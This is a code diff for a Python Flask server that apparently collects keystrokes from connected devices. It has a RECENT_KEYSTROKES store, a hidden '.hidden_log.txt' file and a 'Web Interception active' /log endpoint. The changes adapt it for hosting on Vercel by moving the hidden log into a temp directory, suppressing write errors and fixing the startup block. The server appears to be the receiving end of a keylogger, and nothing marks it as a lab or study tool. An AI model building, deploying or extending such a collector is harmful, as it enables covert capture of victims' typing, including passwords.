@@ -1,6 +1,7 @@
 from flask import Flask, request, send_file
 from flask_cors import CORS
 import os
+import tempfile
 import socket
 import platform
 import datetime
@@ -8,11 +9,14 @@ import datetime
 app = Flask(__name__)
 CORS(app)
 
-LOG_FILE = ".hidden_log.txt"
+LOG_FILE = os.path.join(tempfile.gettempdir(), ".hidden_log.txt") if os.environ.get("VERCEL") else ".hidden_log.txt"
 
 def write_to_log(data):
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(data)
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(data)
+    except Exception as e:
+        print(f"Log write warning: {e}")
 
 CONNECTED_DEVICES = {}
 RECENT_KEYSTROKES = []
@@ -169,23 +173,22 @@ def print_server_display():
 if __name__ == "__main__":
     print_server_display()
 
-   
-port = int(os.environ.get("PORT", 5000))
-render_url = os.environ.get("RENDER_EXTERNAL_URL")
+    port = int(os.environ.get("PORT", 5000))
+    vercel_url = os.environ.get("VERCEL_PROJECT_PRODUCTION_URL") or os.environ.get("VERCEL_URL")
 
-print("\n" + "=" * 60)
+    print("\n" + "=" * 60)
 
-if render_url:
-    print(f"Web Interception active on {render_url}/log")
-else:
-    print(f"Web Interception active on http://127.0.0.1:{port}/log")
+    if vercel_url:
+        print(f"Web Interception active on https://{vercel_url}/log")
+    else:
+        print(f"Web Interception active on http://127.0.0.1:{port}/log")
 
-print(f"System Log File: {os.path.abspath(LOG_FILE)}")
-print("=" * 60 + "\n")
+    print(f"System Log File: {os.path.abspath(LOG_FILE)}")
+    print("=" * 60 + "\n")
 
-app.run(
-    host="0.0.0.0",
-    port=port,
-    debug=False,
-    use_reloader=False
-)
+    app.run(
+        host="0.0.0.0",
+        port=port,
+        debug=False,
+        use_reloader=False
+    )
